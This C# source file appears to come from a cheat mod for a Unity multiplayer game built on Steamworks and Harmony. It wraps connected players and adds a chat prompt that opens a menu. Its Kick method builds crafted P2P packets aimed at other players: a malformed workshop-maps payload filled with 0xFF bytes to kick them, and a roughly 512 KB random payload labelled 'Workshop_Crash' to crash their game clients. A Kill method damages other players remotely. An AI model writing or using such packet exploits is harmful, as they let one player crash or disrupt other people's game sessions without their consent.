using System;
using System.Linq;
using HarmonyLib;
using Steamworks;
using UnityEngine;

namespace LOL;

[HarmonyPatch]
public class Player
{
    // ReSharper disable once InconsistentNaming
    public enum KickMethod
    {
        Normal,
        Client_Init,
        Workshop_Corruption_Kick,
        Workshop_Crash
    }

    public enum PlayerColor
    {
        Yellow,
        Blue,
        Red,
        Green
    }

    private static NetworkPlayer _localPlayer;
    private readonly ConnectedClientData _connectedClient;
    private readonly PlayerColor _playerColor;
    public readonly NetworkPlayer NetworkPlayer;


    public Player(CSteamID steamId)
    {
        _playerColor = (PlayerColor)Array.FindIndex(Clients, client => client != null && client.ClientID == steamId);
        _connectedClient = Clients[(int)_playerColor];
        NetworkPlayer = _connectedClient.PlayerObject.GetComponent<NetworkPlayer>();
    }

    public Player(int playerIndex)
    {
        _playerColor = (PlayerColor)playerIndex;
        _connectedClient = Clients[playerIndex];
        NetworkPlayer = _connectedClient.PlayerObject.GetComponent<NetworkPlayer>();
    }

    public static ConnectedClientData[] Clients { get; private set; }

    public bool IsValid() => Clients != null && IsClientValid(Clients[(int)_playerColor]) && NetworkPlayer != null;

    public string GetPlayerName() => _connectedClient.PlayerName;

    public string GetPlayerDescription() => $"{GetPlayerName()} ({GetPlayerColor().ToString()})";

    public CSteamID GetSteamId() => _connectedClient.ClientID;

    public void Kill() => NetworkPlayer.UnitWasDamaged(0, true);

    public void Kick(KickMethod method)
    {
        var msgType = P2PPackageHandler.MsgType.KickPlayer;
        var payload = new byte[] { 0x00 };

        switch (method)
        {
            case KickMethod.Client_Init:
                msgType = P2PPackageHandler.MsgType.ClientInit;
                break;
            case KickMethod.Workshop_Corruption_Kick:
                payload = new byte[] { 0x01, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
                msgType = P2PPackageHandler.MsgType.WorkshopMapsLoaded;
                break;
            case KickMethod.Workshop_Crash:
                msgType = P2PPackageHandler.MsgType.WorkshopMapsLoaded;
                payload = new byte[524282 /* 0xFFFF * 8 + 2 */];
                new System.Random().NextBytes(payload);
                payload[0] = 0xFF;
                payload[1] = 0xFF;
                break;
        }

        Network.SendPacketToPlayer(this, msgType, payload);
    }

    public PlayerColor GetPlayerColor() => _playerColor;

    public bool IsHost() => MatchmakingHandler.Instance.LobbyOwner == GetSteamId();

    [HarmonyPatch(typeof(ChatManager), "Start")]
    [HarmonyPostfix]
    private static void Start(ref NetworkPlayer ___m_NetworkPlayer)
    {
        Clients = GameManager.Instance.mMultiplayerManager.ConnectedClients;
        _localPlayer = Clients.First(client => IsClientValid(client) && client.ControlledLocally).PlayerObject
            .GetComponent<NetworkPlayer>();

        if (!___m_NetworkPlayer.HasLocalControl)
            return;
        var chatManager = ___m_NetworkPlayer.GetComponentInChildren<ChatManager>();
        chatManager.Talk("Press Q to show the menu!");

        if (Clients == null)
            throw new NullReferenceException("Clients are null!");
        Debug.Log("Clients hooked!");
    }

    public static bool IsClientValid(ConnectedClientData clientData) =>
        clientData != null && clientData.ClientID.IsValid() && clientData.Spawned;
}